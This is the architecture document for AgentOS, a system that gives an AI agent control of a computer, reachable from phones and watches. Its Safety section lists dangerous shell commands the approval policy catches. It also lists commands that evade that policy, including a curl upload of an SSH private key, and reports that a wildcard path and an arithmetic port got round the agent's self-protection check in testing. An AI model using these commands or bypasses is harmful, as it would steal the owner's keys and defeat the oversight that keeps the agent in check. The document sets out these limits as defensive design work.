# Architecture

AgentOS gives an AI agent a computer, and gives its owner a way to talk to
that agent from anywhere — a phone, a watch, a pair of earbuds — as simply
as talking to a person.

The design has one rule: **every piece is small and replaceable, and they
all speak one protocol.**

```
   iPhone · Watch · AirPods · Android · any browser
                     │
                     │  HTTP + WebSocket (JSON)  — @agentos/protocol
                     │  direct over LAN / Tailscale, or through a relay
                     ▼
┌──────────────────────────────────────────────────────────────┐
│  Computer (macOS · Windows · Linux)                          │
│                                                              │
│  Desktop app (Tauri shell)                                   │
│   onboarding · OS mode (full screen) · side panel · tray     │
│        │ loads the UI from, and starts ▼                     │
│  Core daemon (TypeScript) ── also runs alone: `agentos start`│
│   ├─ server      API, events, pairing, serves the web UI     │
│   ├─ node        threads, requests, status — the state       │
│   ├─ store       append-only files in ~/.agentos             │
│   ├─ policy      what the agent may do without asking        │
│   ├─ engine      the brain   → Claude (Agent SDK) · mock     │
│   ├─ @agentos/computer  eyes & hands → agent-desktop         │
│   └─ @agentos/voice     ears & mouth → device · premium      │
└──────────────────────────────────────────────────────────────┘
```

## Repository

| Path | What | Language |
|---|---|---|
| `packages/protocol` | The wire protocol: schemas, routes, pairing links. The single source of truth. | TypeScript (zod) → JSON Schema |
| `packages/core` | The daemon and the `agentos` command. | TypeScript, Node ≥ 20 |
| `packages/computer` | Screen, UI tree, mouse, keyboard — behind one small interface. | TypeScript + native CLI |
| `packages/voice` | Speech-to-text and text-to-speech providers. | TypeScript |
| `packages/ui` | Onboarding, OS mode, side panel, and the web client. Served by the core. | React + Vite |
| `packages/design` | The design system: one `tokens.json`, generated into CSS, Swift and TypeScript; the Figtree font; the brand. | JSON + plain Node |
| `packages/presence` | The agent's presence: a pure model and a canvas renderer. | TypeScript |
| `packages/relay` | The relay a computer can connect out to. | TypeScript, Node ≥ 20 |
| `apps/desktop` | The desktop shell: windows, tray, permissions, starts the core. | Tauri 2 (Rust) |
| `apps/ios` | iPhone and Apple Watch apps. | Swift / SwiftUI |
| `apps/site` | The website. | Astro |
| `apps/android` | Android app. | Kotlin (planned) |

## Concepts

**Computer (node).** A machine running the core. It has a name, an agent
(with a name), an owner, a language and an autonomy level.

**Thread.** A conversation with the agent. Each computer always has one
`main` thread: the single conversation a person has with their agent. The
agent can start **jobs** — background threads, usually bound to a project
folder — and is told when they finish. That is the whole orchestration
model: one conversation on top, any number of jobs underneath.

**Item.** What appears in a thread's timeline: a `message` (someone said
something), an `activity` (one human-readable line about what the agent is
doing) or a `request`.

**Request.** The agent needs its owner. Either the safety policy stopped an
action (`approval`) or the agent chose to ask (`question`: "Everything
looks good — deploy to production?"). A request carries a sentence written
to be spoken, and optionally a screenshot of what the agent sees. It can be
answered from any client by tap or by voice; the first answer wins.

**Event.** Every change is an event with a sequence number, appended to a
log and pushed over a WebSocket. A client that reconnects says where it
stopped and receives what it missed. Clients never poll.

## The three replaceable organs

**Engine — the brain.** `Engine` is an interface (`packages/core/src/engine`).
The first engine drives Claude through the Claude Agent SDK, which brings
file, shell and sub-agent tools. A `mock` engine replays a script so that
every client can be developed and tested without credentials. Other models
plug in by implementing the same interface.

**Computer — eyes and hands.** `Computer` is an interface
(`packages/computer`). The backend is
[agent-desktop](https://github.com/vercel-labs/agent-desktop): it reads the
operating system's accessibility tree and acts on elements by reference,
without moving the pointer, on macOS, Windows and Linux. Screenshots are
used for the owner's eyes (approvals, "show me the screen") and as a
fallback for apps with no accessibility tree.

**Voice — ears and mouth.** `Voice` is an interface (`packages/voice`).
The agent is always the brain; voice only converts. By default
(`device`) the phone recognises and synthesises speech itself and the
computer never sees audio: zero keys, zero setup. Adding one key for a
premium provider moves both to the computer, which streams audio to the
client. Keys never leave the computer. A `local` provider talks to any
OpenAI-compatible speech server (for example mlx-audio running open models
on the same Mac) for a premium voice with no cloud at all.

## Safety

An agent with a shell, files and the screen can do on the computer what its
owner can. Nothing below changes that. What it does is keep strangers out,
keep the agent's hands off AgentOS's own controls, and make the agent stop
and ask before the actions it recognises as risky. An agent that reads a
hostile web page, email or repository and acts on it remains a risk that
the approvals reduce and do not remove.

### Who may talk to the computer

- Every route except `GET /v1/hello` and `POST /v1/pair` needs a token. A
  device gets its own by scanning a pairing code shown on the computer: one
  use, five minutes, attempts limited per address. The computer keeps only
  a hash of each device token.
- Apps on the computer itself use the **local token**. It is believed only
  on connections that come from the computer itself (loopback), never from
  the local network, Tailscale or the relay.
  - **Started by the desktop app** (`AGENTOS_LOCAL_TOKEN_STDIN=1`), the core
    reads the token the app made on its standard input. The token is never
    written to disk, and a stale `local-token` file is deleted. The
    `agentos` command then has nothing to authenticate with, and says so.
  - **Started by hand** (`agentos start`), the core makes a new token at
    every start and keeps it in `local-token` (mode 600) until it stops.
    Any program running as the same user can read that file.
- Before it sends the local token, the `agentos` command asks
  `GET /v1/hello?challenge=<random>` and checks the answer's `proof`, an
  HMAC of the challenge keyed with the token. Something that took the port
  first cannot produce the proof and receives nothing.
- The server checks the `Host` header, so a web page cannot reach it
  through DNS rebinding. The app's page is served with a strict
  Content-Security-Policy (its own scripts and styles only, no frames).
  Every response says `Referrer-Policy: no-referrer`, so an address that
  carries a token never leaks through a `Referer` header.

### On the network

- One port serves two kinds of connection. A connection that opens with a
  TLS handshake gets HTTPS with the computer's own certificate: a P-256
  key and a self-signed certificate made on first start (`tls-key.pem`,
  `tls-cert.pem`). The pairing link carries the certificate's SHA-256
  fingerprint, and clients pin it on every connection. No certificate
  authority is involved. Someone on the same Wi-Fi sees only encrypted
  traffic, and cannot pose as the computer without its key.
- Plain HTTP is answered only from the computer itself, or on one of the
  computer's own Tailscale addresses from a Tailscale peer (Tailscale
  encrypts). Any other plain-HTTP connection is refused with a 403 before
  anything it sent is read.
- The relay is reached over `https://`. The core refuses any other relay
  address unless it is on the computer itself. The relay ends TLS, so
  **whoever runs it sees everything that passes**: messages, screenshots,
  device tokens on their way. With those, they could act as a paired
  device. They cannot use the local token. Run your own relay, or use one
  run by someone you would trust with the computer.

### What the agent may do alone

- **Autonomy** has three positions. The policy (`packages/core/src/policy.ts`)
  turns each tool call into *allow*, *ask the owner* or *refuse*.
  - `supervised` asks before anything that is not read-only.
  - `balanced` (the default) asks before what it recognises as risky.
  - `autonomous` never asks.
- `balanced` recognises:
  - shell commands of known dangerous shapes: `rm -r`/`rm -f`,
    `find -delete`, `sudo`, force-push and pushes to `main`,
    `git reset --hard`, publishing, deploying, `curl … | sh`,
    `DROP TABLE`, disk and system tools, and so on;
  - calls that the computer's own tools rate as high risk (a "Pay" button,
    quitting an app);
  - every tool of an MCP server the owner connected (mail, calendars,
    hosting…), unless the tool is known to only read. Known means the
    server declares it read-only, or, when the server says nothing, the
    tool's name starts with `list`, `get`, `search`, `read`, `query`,
    `fetch`, `describe` or `inspect`. A tool its server declares
    destructive is a high-risk question.
- `balanced` recognises the shape of a command, not its effect. These all
  pass without a question:
  - `rm file` (no `-r` or `-f`);
  - `find … -exec rm {} \;`;
  - `python3 -c "import shutil; shutil.rmtree(…)"`;
  - `mv` over an existing file;
  - `rsync --delete`;
  - an `osascript` that sends mail;
  - `curl -F file=@~/.ssh/id_ed25519 https://…`;
  - appending to `~/.zshrc`, or editing any file with the file tools.
- The agent is also told to ask, with a screenshot, before anything
  irreversible or outward-facing. That is an instruction to the model, not
  a guarantee.
- A question shows what would be approved. A long command keeps its
  beginning, its end and the part that raised the question, and says how
  many characters are left out.
- An approval is answered by a tap, or by words that a client explicitly
  binds to it (`requestId`). Only a plain yes or no from a short list
  counts. Anything else ("ok thanks", "fine", a question) leaves the request
  waiting. A message that does not name the request never answers it.

### Keeping the agent away from AgentOS itself

- In every autonomy mode, the policy refuses a tool call whose input names
  any of these, and the journal records the refusal:
  - the data folder;
  - the core's port on this computer;
  - the `agentos` command.
  That check matches patterns, so it only slows an agent down. A command
  that builds the path or the port from pieces, uses a wildcard, or runs a
  script that does gets through. In a test against a hand-started core,
  `cat` with a wildcard read the token and a port written as arithmetic
  reached the API.
- Claude Code's own file tools are also denied the data folder, by
  permission rules (`Read(//<folder>/**)`, `Edit(//<folder>/**)`).
- The engine's environment carries no `AGENTOS_*` variable and no voice
  key. Claude Code receives the Anthropic key on a private pipe, not in its
  environment, so the agent's commands do not inherit it (except on
  Windows, where the key travels in the environment as before).
- What actually closes the door:
  - **The desktop app.** With no local token on disk, the agent's commands
    have nothing to read, and the API answers them with 401.
  - **`sandbox: true`** (off by default). Shell commands run in Claude
    Code's sandbox, with the data folder unreadable and unwritable and the
    computer's own ports out of reach. That also protects `secrets.json`
    and `tls-key.pem`, which nothing else here does. The cost, measured:
    commands cannot write outside the folder they work in, cannot reach
    any local port (dev servers, databases, Docker), and cannot reach Unix
    sockets (the ssh agent, `docker.sock`). Each new internet host goes
    through the policy, which allows it.
- **Project settings** are off by default (`projectSettings: false`). Only
  the owner's own Claude Code settings apply. A folder's `.claude/`
  settings, which include its hooks and MCP servers, would run with the
  owner's rights outside this policy, so they wait for the owner's
  opt-in. Project instructions are not lost: the agent is told to read a
  project's `CLAUDE.md` or `AGENTS.md` as information.
- The agent is told that what it reads (pages, files, emails, the screen,
  a job's report) is information, never orders. It is told to refuse, and
  report to the owner, anything that asks it to change its own settings,
  read its own data folder or approve its own requests.

### What remains

- A program running as the owner can do what the owner can. It can read
  the data folder (`secrets.json`, `tls-key.pem`, the conversations) and,
  for a hand-started core, the local token. The desktop app's mode only
  takes the token off the disk.
- The computer tools refuse AgentOS's own app (`packages/computer/src/guard.ts`):
  they will not read its window, so they never get a reference to click
  its "Go ahead", and they will not type or press keys while it is in
  front. They do not cover the same interface open in a browser tab, a
  picture of the whole screen, or a shell that drives the screen with the
  system's own automation (`osascript`, for one).
- With no API key in Settings, the Claude engine uses whatever Claude
  Code login this computer already has, and with it the owner's own
  connected tools (their user-level MCP servers).

## Networking

A client reaches the computer on one TCP port (4747).

1. **Same network**: works out of the box, over HTTPS with the computer's
   own certificate, which the pairing link tells the client to expect.
2. **Anywhere, no server**: install [Tailscale](https://tailscale.com) on
   both. AgentOS detects it and puts the Tailscale address in the QR code.
   Tailscale encrypts the connection.
3. **Anywhere, your own server**: run the relay (`packages/relay`, one
   container). The computer connects out to it over `https://`, and clients
   connect to the relay.
   - The relay is private by default: only computers that present the
     token its owner chose may use it.
   - It ends TLS, so its operator can see what passes through it (see
     Safety).
   - It does not send notifications: the computer sends them to Apple
     itself.

Several computers are simply several pairings: the phone holds the list and
shows them together.

## Data on disk

```
~/.agentos/
  config.json        who the agent is, autonomy, engine, voice, port
  secrets.json       API keys
  local-token        token for apps on this computer — only while a core started
                     by hand runs; never written when the desktop app starts it
  tls-key.pem        the computer's TLS key and certificate, made on first start;
  tls-cert.pem       the pairing link carries the certificate's fingerprint
  node.json          this computer's id
  devices.json       paired devices (token hashes only)
  events.jsonl       the event log
  threads.json       thread index
  threads/<id>.jsonl items of one thread
  files/<id>         screenshots and other binaries
  logs/core.log      what the core did, when nobody is at a terminal to read it
                     (mode 600, 1 MB, one older file kept as core.log.1)
```

The folder is the owner's alone: mode 700, everything in it 600, and the
core takes back any wider permission it finds at start.

The log tells what happened, never what was said: states, errors and
addresses. It holds no message, no command, no token or key, and none of the
owner's file names: a path in an error message is struck out. It also notes
changes of autonomy (from what to what, and by whom), each pairing code
made, each device added or removed, and each call the policy refused.

Plain files, append-only where possible. No database to install.

## Configuration

Everything has a default. Settings live in `config.json` and are changed
from the app. An environment variable, when set, wins over the file and is
never written back to it.

| Variable | In `config.json` | Meaning | Default |
|---|---|---|---|
| `AGENTOS_HOME` | — | Data directory | `~/.agentos` |
| `AGENTOS_PORT` | `port` | Port | `4747` |
| `AGENTOS_HOST` | `host` | Address to listen on (also `--host`); `127.0.0.1` keeps every other device out | every interface |
| `AGENTOS_SANDBOX` | `sandbox` | `1`: run the agent's shell commands in Claude Code's sandbox (see Safety for what it costs) | off |
| `AGENTOS_PROJECT_SETTINGS` | `projectSettings` | `1`: let a project folder's own Claude Code settings apply, hooks and MCP servers included | off |
| `AGENTOS_ENGINE` | `engine` | `claude` or `mock` | `claude` |
| `AGENTOS_MODEL` | `model` | Model id for the engine | engine default |
| `AGENTOS_VOICE` | `voice.provider` | `device`, `elevenlabs` or `local` | `device` |
| `AGENTOS_VOICE_URL` | `voice.url` | Address of a local OpenAI-compatible speech server (`local`) | — |
| `AGENTOS_RELAY_URL` | `relayUrl` | Relay to connect out to (see `packages/relay`) | — |
| `AGENTOS_APNS_KEY_ID` | `push.keyId` | Id of the Apple push signing key | — |
| `AGENTOS_APNS_TEAM_ID` | `push.teamId` | Apple developer team the key belongs to | — |
| `AGENTOS_APNS_TOPIC` | `push.topic` | Bundle id of the iOS app to notify | — |
| — | `workspace` | Folder the agent works in | your home folder |
| — | `voice.voice` | Voice name or id at the provider | provider default |
| — | `voice.sttModel`, `voice.ttsModel` | Speech models, where the provider lets you choose | provider default |

`config.json` also holds what onboarding asks: `name` (the computer),
`agentName`, `ownerName`, `language`, `autonomy`, `onboarded`.

Keys are kept apart, in `secrets.json`, and never returned by the API.
Here too the environment wins:

| Variable | Meaning |
|---|---|
| `ANTHROPIC_API_KEY` | Key for the Claude engine, handed to Claude Code on a private pipe. Without one, Claude Code uses whatever login it already has on the computer, and the owner's own connected tools come with it. |
| `ANTHROPIC_WORKSPACE_ID` | Workspace that goes with the key, for a key that is not tied to one |
| `ELEVENLABS_API_KEY` | Key for the ElevenLabs voice (any voice provider: `<PROVIDER>_API_KEY`) |
| `AGENTOS_RELAY_TOKEN` | Token of a private relay (one started with `RELAY_TOKEN`) |
| `AGENTOS_APNS_KEY` | Apple push signing key: the `.p8` file's path, or its contents. Notifications to the phone are off until this and the three `AGENTOS_APNS_*` settings above are given — they belong to whoever built the iOS app. |

Started by the desktop app or by the system rather than from a terminal,
the core has none of what your shell profile sets up. It then asks your
login shell once, at start, for its environment, and takes from it the
`PATH` and every variable it was not given itself — so that the agent's
commands find `git`, `node` or `python` as they do in your terminal. What
the core was given always wins, and a profile that is slow (4 seconds) or
broken is simply not waited for. Not on Windows, where there is no such gap.

For development and packaging:

| Variable | Meaning | Default |
|---|---|---|
| `AGENTOS_UI_DIR` | Folder of the built web app | `packages/ui/dist` |
| `AGENTOS_CLAUDE_BIN` | Claude Code binary to run, for an app that ships its own | the one in the Agent SDK |
| `AGENTOS_MOCK_SPEED` | Scales the mock engine's delays; `0` is instant | `1` |
| `AGENTOS_PARENT_PID` | Internal: the desktop app sets it to its own process id when it starts the core, which then stops cleanly once that process is gone | — |
| `AGENTOS_LOCAL_TOKEN_STDIN` | Internal: `1` when the desktop app starts the core. The core reads the local token, one line of at least 32 random characters, on its standard input within 10 seconds, then closes it. The token is never written to disk. A pipe is private: an argument or a variable would be visible to the owner's other programs | — |
